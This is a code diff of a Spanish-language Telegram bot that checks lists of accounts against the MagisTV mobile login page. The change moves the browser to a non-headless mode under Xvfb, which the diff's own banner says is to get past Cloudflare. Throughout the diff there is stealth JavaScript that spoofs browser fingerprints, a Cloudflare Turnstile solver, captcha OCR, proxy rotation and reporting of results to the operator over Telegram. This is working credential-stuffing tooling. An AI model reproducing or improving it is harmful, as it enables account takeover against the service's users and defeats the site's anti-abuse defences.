@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 ╔══════════════════════════════════════════════════════════════╗
-║   🎬 Flujo TV — Telegram Bot Checker (VPS Headless)        ║
-║   Debug + Screenshots + Anti-Detección Mejorada            ║
+║   🎬 Flujo TV — Telegram Bot (VPS + Xvfb)                 ║
+║   headless=False con pantalla virtual = Pasa Cloudflare    ║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
@@ -26,6 +26,10 @@ os.makedirs(BOT_DATA_DIR, exist_ok=True)
 STOP_FILE = "/tmp/flujo_bot_stop"
 SCREENSHOT_DIR = os.path.join(BOT_DATA_DIR, "screenshots")
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+
+# Forzar DISPLAY para xvfb
+if not os.environ.get("DISPLAY"):
+    os.environ["DISPLAY"] = ":99"
 
 bot_state = {
     "running": False,
@@ -212,58 +216,36 @@ def get_captcha_img(page):
     return None
 
 # ════════════════════════════════════════════════════════════════════════
-#  STEALTH SCRIPTS (anti-detección headless)
+#  STEALTH + MOUSE + CF
 # ════════════════════════════════════════════════════════════════════════
 
 STEALTH_JS = """
-// Ocultar webdriver
 Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
 Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
 Object.defineProperty(navigator, 'platform', {get: () => 'Linux armv81'});
-
-// Chrome runtime
 window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
-
-// Permissions
 const originalQuery = window.navigator.permissions.query;
 window.navigator.permissions.query = (parameters) =>
     parameters.name === 'notifications'
         ? Promise.resolve({state: Notification.permission})
         : originalQuery(parameters);
-
-// Plugins
 Object.defineProperty(navigator, 'plugins', {
     get: () => [1, 2, 3, 4, 5].map(() => ({
-        name: 'Chrome PDF Plugin',
-        filename: 'internal-pdf-viewer',
-        description: 'Portable Document Format',
-        length: 1
+        name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer',
+        description: 'Portable Document Format', length: 1
     }))
 });
-
-// WebGL
 const getParameter = WebGLRenderingContext.prototype.getParameter;
 WebGLRenderingContext.prototype.getParameter = function(parameter) {
     if (parameter === 37445) return 'Intel Inc.';
     if (parameter === 37446) return 'Intel Iris OpenGL Engine';
     return getParameter.call(this, parameter);
 };
-
-// Mouse tracking
-window._mx = 210;
-window._my = 450;
-document.addEventListener('mousemove', e => {
-    window._mx = e.clientX;
-    window._my = e.clientY;
-});
-
-// Iframe contentWindow fix
+window._mx = 210; window._my = 450;
+document.addEventListener('mousemove', e => { window._mx = e.clientX; window._my = e.clientY; });
 const elementDescriptor = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
 Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
-    get: function() {
-        const iframe = elementDescriptor.get.call(this);
-        try { return iframe; } catch(e) { return null; }
-    }
+    get: function() { try { return elementDescriptor.get.call(this); } catch(e) { return null; } }
 });
 """
 
@@ -335,7 +317,6 @@ def handle_cf(page, chat_id=None):
             if has_ts: break
     if has_ts:
         if solve_turnstile(page): return True
-    # Último intento: esperar más
     for _ in range(20):
         page.wait_for_timeout(1000)
         if _has_login(page): return True
@@ -380,7 +361,7 @@ def translate_err(code, msg):
 
 def is_ip_restricted(msg):
     m = (msg or "").lower()
-    return "restring" in m or "restricted" in m
+    return "restrin" in m or "restricted" in m
 
 def check_ip_fast(context):
     try:
@@ -395,26 +376,18 @@ def check_ip_fast(context):
         return "?"
 
 def send_debug_screenshot(page, chat_id, label="debug"):
-    """Toma screenshot y la envía por TG (máx 3 por check para no flood)"""
     if bot_state.get("debug_sent", 0) >= 3: return
     try:
         path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
         page.screenshot(path=path, full_page=False)
-        with open(path, "rb") as f:
-            img_data = f.read()
-        # Obtener título y URL para contexto
-        title = page.title() or "?"
-        url = page.url or "?"
+        with open(path, "rb") as f: img_data = f.read()
+        title = page.title() or "?"; url = page.url or "?"
         caption = f"🐛 <b>Debug:</b> {label}\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
         tg_send_photo(chat_id, img_data, caption=caption)
         bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
         os.remove(path)
     except Exception as e:
         print(f"  [!] Screenshot error: {e}")
-
-# ════════════════════════════════════════════════════════════════════════
-#  PROGRESO
-# ════════════════════════════════════════════════════════════════════════
 
 def update_progress(chat_id, msg_id, account_name, result_str, stats):
     try:
@@ -446,7 +419,7 @@ def update_progress(chat_id, msg_id, account_name, result_str, stats):
     except: pass
 
 # ════════════════════════════════════════════════════════════════════════
-#  MOTOR DE CHECK
+#  MOTOR DE CHECK — HEADLESS=FALSE + Xvfb
 # ════════════════════════════════════════════════════════════════════════
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
@@ -464,16 +437,16 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     }
     ocr_engine = init_ocr()
     use_ocr = ocr_engine is not None
-    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
+    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
     with sync_playwright() as p:
+        # ═══ HEADLESS=FALSE — Usa la pantalla virtual de Xvfb ═══
         browser = p.chromium.launch(
-            headless=True,
+            headless=False,
             args=[
                 "--disable-blink-features=AutomationControlled",
-                "--no-sandbox", "--disable-dev-shm-usage",
-                "--disable-gpu",
-                "--disable-features=IsolateOrigins,site-per-process",
+                "--no-sandbox",
+                "--disable-dev-shm-usage",
                 "--disable-infobars",
                 "--window-size=420,900",
                 "--disable-background-timer-throttling",
@@ -501,7 +474,8 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             ctx_kw = {
                 "user_agent": UA,
                 "viewport": {"width": 420, "height": 900},
-                "is_mobile": True, "has_touch": True,
+                "is_mobile": True,
+                "has_touch": True,
                 "screen": {"width": 420, "height": 900},
                 "device_scale_factor": 2.5,
                 "extra_http_headers": {
@@ -530,12 +504,11 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx error: {str(e)[:40]}", stats)
                 idx = batch_end; continue
 
-            # Navegar
             nav_ok = False
             nav_error = ""
             for attempt in range(3):
                 try:
-                    page.goto("https://vip.magistv.net/mobile/login", 
+                    page.goto("https://vip.magistv.net/mobile/login",
                              wait_until="domcontentloaded", timeout=45000)
                     nav_ok = True; break
                 except Exception as e:
@@ -547,15 +520,12 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 stats["fails"] = fails; stats["processed"] = processed
                 update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Nav fail: {nav_error}", stats)
                 consecutive_cf_fails += 1
-                # Enviar screenshot y debug
                 try:
                     send_debug_screenshot(page, chat_id, f"nav_fail_b{batch_num}")
-                    tg_send_msg(chat_id, f"🐛 <b>Nav Fail Batch {batch_num}</b>\nError: <code>{escape_html(nav_error)}</code>\nURL: <code>{escape_html(page.url)}</code>\nTitle: <code>{escape_html(page.title())}</code>",
-                              disable_notification=True)
+                    tg_send_msg(chat_id, f"🐛 <b>Nav Fail B{batch_num}</b>\n<code>{escape_html(nav_error)}</code>", disable_notification=True)
                 except: pass
-                # Si falla 3 batches seguidos, pausar un poco
                 if consecutive_cf_fails >= 3:
-                    tg_send_msg(chat_id, "⚠️ 3 batches seguidos fallando nav — esperando 15s...", disable_notification=True)
+                    tg_send_msg(chat_id, "⚠️ 3 batches nav fail — pausa 15s", disable_notification=True)
                     time.sleep(15)
                     consecutive_cf_fails = 0
                 idx = batch_end
@@ -563,21 +533,18 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 except: pass
                 continue
 
-            # Cloudflare
             cf_ok = handle_cf(page, chat_id)
             if not cf_ok:
                 fails += (batch_end - idx); processed += (batch_end - idx)
                 stats["fails"] = fails; stats["processed"] = processed
                 update_progress(chat_id, msg_id, f"Batch {batch_num}", "CF fail", stats)
                 consecutive_cf_fails += 1
-                # Enviar screenshot del CF
                 try:
                     send_debug_screenshot(page, chat_id, f"cf_fail_b{batch_num}")
-                    tg_send_msg(chat_id, f"🐛 <b>CF Fail Batch {batch_num}</b>\nURL: <code>{escape_html(page.url)}</code>\nTitle: <code>{escape_html(page.title())}</code>\nIfs: {page.locator('iframe').count()}",
-                              disable_notification=True)
+                    tg_send_msg(chat_id, f"🐛 <b>CF Fail B{batch_num}</b>\nURL: <code>{escape_html(page.url)}</code>", disable_notification=True)
                 except: pass
                 if consecutive_cf_fails >= 3:
-                    tg_send_msg(chat_id, "⚠️ 3 batches con CF — esperando 20s...", disable_notification=True)
+                    tg_send_msg(chat_id, "⚠️ 3 batches CF fail — pausa 20s", disable_notification=True)
                     time.sleep(20)
                     consecutive_cf_fails = 0
                 idx = batch_end
@@ -585,10 +552,8 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 except: pass
                 continue
 
-            # CF resuelto OK
             consecutive_cf_fails = 0
 
-            # Verificar IP
             if use_proxy:
                 ip = check_ip_fast(context)
                 stats["ip"] = ip
@@ -596,10 +561,9 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 if ip == "?":
                     try:
                         send_debug_screenshot(page, chat_id, f"ip_unknown_b{batch_num}")
-                        tg_send_msg(chat_id, f"⚠️ <b>IP desconocida</b> Batch {batch_num} — el proxy podría no estar funcionando", disable_notification=True)
+                        tg_send_msg(chat_id, f"⚠️ IP desconocida B{batch_num} — ¿proxy caído?", disable_notification=True)
                     except: pass
 
-            # Interceptor
             state = {}
             NON_LOGIN = ["/codigo", "/info", "/dashboard", "/home/img", "/img"]
 
@@ -618,7 +582,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                             d = resp.json()
                             if d.get("code") == 200 and d.get("data"):
                                 st["info"] = d["data"]
-                            elif "restring" in d.get("msg", "").lower():
+                            elif "restrin" in d.get("msg", "").lower():
                                 st["login_code"] = d.get("code", 500)
                                 st["login_msg"] = d.get("msg", "")
                                 st["api_hit"] = True
@@ -1011,7 +975,7 @@ def process_update(upd):
 def main():
     print()
     print("  ╔═══════════════════════════════════════════════════╗")
-    print("  ║  🎬 Flujo TV — Telegram Bot (VPS Headless)      ║")
+    print("  ║  🎬 Flujo TV — Telegram Bot (VPS + Xvfb)        ║")
     print("  ╚═══════════════════════════════════════════════════╝")
     print()
     print("  [*] Instalando dependencias...")
@@ -1019,10 +983,30 @@ def main():
     if not pw_ok:
         print("  [✗] No se pudo instalar playwright")
         sys.exit(1)
+
+    # Verificar que Xvfb está corriendo
+    display = os.environ.get("DISPLAY", ":99")
+    print(f"  [*] DISPLAY={display}")
+    try:
+        r = subprocess.run(["xdpyinfo"], capture_output=True, text=True, timeout=5)
+        if r.returncode != 0:
+            print("  [!] Xvfb NO está corriendo. Ejecuta:")
+            print("      systemctl start xvfb")
+            print("  [*] Intentando iniciar Xvfb automáticamente...")
+            subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(2)
+    except FileNotFoundError:
+        print("  [!] xdpyinfo no encontrado. Instala: apt install -y x11-utils")
+        print("  [*] Intentando iniciar Xvfb...")
+        subprocess.Popen(["Xvfb", display, "-screen", "0", "1280x1024x24", "-ac"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+
     print(f"  [✓] Playwright OK | OCR: {'✅' if ocr_ok else '❌'}")
     print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
     print(f"  [✓] Rotar cada: {ROTATE_EVERY} cuentas")
-    print(f"  [✓] Headless + Stealth + Screenshots")
+    print(f"  [✓] Modo: Xvfb (headless=False real)")
     print()
     tg_api("deleteWebhook", {"drop_pending_updates": True})
     print("  [✓] Bot iniciado — Esperando mensajes...")
